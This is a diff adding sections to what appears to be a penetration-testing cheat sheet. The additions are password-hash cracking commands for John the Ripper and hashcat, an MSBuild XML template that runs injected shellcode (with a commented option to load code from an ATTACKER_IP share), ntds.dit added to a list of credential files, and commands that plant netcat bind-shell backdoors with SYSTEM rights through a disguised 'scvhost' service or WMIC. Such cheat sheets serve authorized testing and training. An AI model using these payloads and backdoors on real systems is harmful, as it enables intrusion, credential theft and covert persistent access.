@@ -648,6 +648,8 @@ searchsploit -m /path/to/exploit # mirror exploit file to current directory
 
 ### 4.2.1. Cracking with John The Ripper
 
+Use john for the common cases of cracking.
+
 ```sh
 # afer collecting /etc/passwd and /etc/shadow
 unshadow passwd shadow > unshadowed
@@ -655,7 +657,60 @@ unshadow passwd shadow > unshadowed
 # crack unshadow
 # the "=" is required for wordlist
 john --wordlist=/mnt/vm-share/rockyou.txt unshadowed
+
+# crack hashes by feeding back in the potfile to a different hash mode
+john --loopback --format=nt ntlm.hashes
+
+# feed custom wordlist via stdin
+crunch 7 7 @@@@@@@ | john --stdin hashes
+# can also use "--pipe" to bulk read and allow rules
+
+# resume last cracking session that was stopped mid-way
+john --restore
+
+# show cracked hashes from potfile matching those in hashfile
+john --show --format=nt hashfile
 ```
+
+### Cracking with Hashcat
+
+When to use hashcat:
+- You have a hash type that john doesn't understand
+- You need MOAR SPEED
+
+```sh
+# hashcat doesn't automatically ID hashes like john. You have to specify the
+# hash mode manually with the "-m" flag. Look up hashcat modes at:
+# https://hashcat.net/wiki/doku.php?id=example_hashes
+# or do:
+hashcat --help | grep -i "md5"
+hashcat --example-hashes | grep -FB2 ' $1$'  # "-F"=force raw string lookup
+
+# specify mangling rules with addition of
+-r /usr/share/doc/hashcat/rules/best64.rule
+
+# basic crack syntax:
+# hashcat -m MODE [OPTIONS] HASH/FILE WORDLIST [WORDLIST...]
+
+# common options:
+# -a NUM - attack mode (0 = use wordlists, 1 = combo words in list, 3 = brute force)
+# -w NUM - workload (2 = default, 3 = degrades your gui, 4 = max)
+
+# cracking /etc/shadow with sha512crypt hashes ("$6$...")
+hashcat -m1800 -a0 -w3 shadow /mnt/vm-share/rockyou.txt
+
+# resume last cracking session that was stopped mid-way
+hashcat --restore
+
+# showing cracked hashes, with username, from /etc/shadow's sha512crypt hashes
+# hashcat has a potfile (hashcat.potfile) to store old passwords
+hashcat -m1800 --show --username --outfile-format=2 shadow
+```
+
+NOTE: hashcat doesn't feed usernames into the wordlists automatically like john
+does, nor does it automatically reverse the usernames. To do this, you have to
+manually add the usernames as an additional wordlist file, and add mangling
+rules.
 
 ### 4.2.2. MS SQL Server Bruteforcing
 
@@ -1083,6 +1138,98 @@ certutil -decode encodedInputFileName decodedOutputFileName
 certutil --decodehex encoded_hexadecimal_InputFileName
 :: MD5 checksum
 certutil.exe -hashfile somefile.txt MD5
+```
+
+### Execute Inline Tasks with MSBuild.exe
+
+MSBuild is built into Windows .NET framework, and it lets you execute arbitrary
+C#/.NET code inline. Modify the XML file below with your shellcode from
+msfvenom's "-f csharp" format (or build a payload with Empire's
+windows/launcher_xml stager, or write your own C# and host over SMB)
+
+To build:
+```bat
+:: locate MSBuild executables
+dir /b /s C:\msbuild.exe
+
+:: execute 32-bit shellcode
+C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml
+
+:: execute 64-bit shellcode
+C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml
+```
+
+Here's the payload.xml template to inject your shellcode into (if not building
+with Empire)
+
+```xml
+<!-- This is 32-bit. To make 64-bit, swap all UInt32's for UInt64, use 64-bit
+     shellcode, and build with 64-bit MSBuild.exe
+-->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes shellcode. -->
+  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
+  <!-- Save This File And Execute The Above Command -->
+  <!-- Author: Casey Smith, Twitter: @subTee -->
+  <!-- License: BSD 3-Clause -->
+  <Target Name="Hello">
+    <ClassExample />
+  </Target>
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+
+      <Code Type="Class" Language="cs">
+      <!-- to host code remotely, instead use:
+      <Code Type="Class" Language="cs" Source="\\ATTACKER_IP\share\source.cs">
+      -->
+      <![CDATA[
+        using System;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        public class ClassExample :  Task, ITask
+        {
+          private static UInt32 MEM_COMMIT = 0x1000;
+          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+          [DllImport("kernel32")]
+            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+          [DllImport("kernel32")]
+            private static extern IntPtr CreateThread(
+            UInt32 lpThreadAttributes,
+            UInt32 dwStackSize,
+            UInt32 lpStartAddress,
+            IntPtr param,
+            UInt32 dwCreationFlags,
+            ref UInt32 lpThreadId
+            );
+          [DllImport("kernel32")]
+            private static extern UInt32 WaitForSingleObject(
+            IntPtr hHandle,
+            UInt32 dwMilliseconds
+            );
+          public override bool Execute()
+          {
+            //PUT YOUR SHELLCODE HERE;
+
+            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
+            IntPtr hThread = IntPtr.Zero;
+            UInt32 threadId = 0;
+            IntPtr pinfo = IntPtr.Zero;
+            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+            return true;
+          }
+        }
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
 ```
 
 ## 5.5. Windows UAC Bypass
@@ -1854,6 +2001,7 @@ powershell iwr -uri http://7-zip.org/a/7z1604-x64.exe -outfile 7zip.exe
 %WINDIR%\repair\system
 %WINDIR%\repair\software
 %WINDIR%\repair\security
+%SYSTEMROOT%\ntds\ntds.dit
 %WINDIR%\iis6.log
 %WINDIR%\system32\config\AppEvent.Evt
 %WINDIR%\system32\config\SecEvent.Evt
@@ -2011,6 +2159,34 @@ sed '/PAT1/,/PAT2/!d;//d' FILE
 ```
 
 # 8. Windows Persistence
+
+## Remote SYSTEM Backdoor via Windows Service
+
+```bat
+:: You must establish SMB session with admin creds first!!
+net use \\VICTIM_NAME [PASSWORD] /u:Administrator
+:: or mount an smb share on the target:
+net use * \\VICTIM_NAME\[share] [PASSWORD] /u:Administrator
+
+:: open a backdoor netcat bind-shell with system privileges on a remote host
+sc \\VICTIM_NAME create scvhost binpath= "cmd.exe /k c:\temp\nc.exe -l -p 22222 -e cmd.exe"
+
+:: start the service
+sc \\VICTIM_NAME start scvhost
+
+:: delete the service
+sc \\VICTIM_NAME delete scvhost
+```
+
+## Remote Admin Bacdoor via WMIC
+
+```bat
+:: create admin bind-shell backdoor. Use '-d' for it to run without window
+wmic process call create "c:\temp\nc.exe -dlp 22222 -e cmd.exe"
+
+:: delete the wmic process
+wmic process where name="nc.exe" delete
+```
 
 ## 8.1. Add RDP User
 
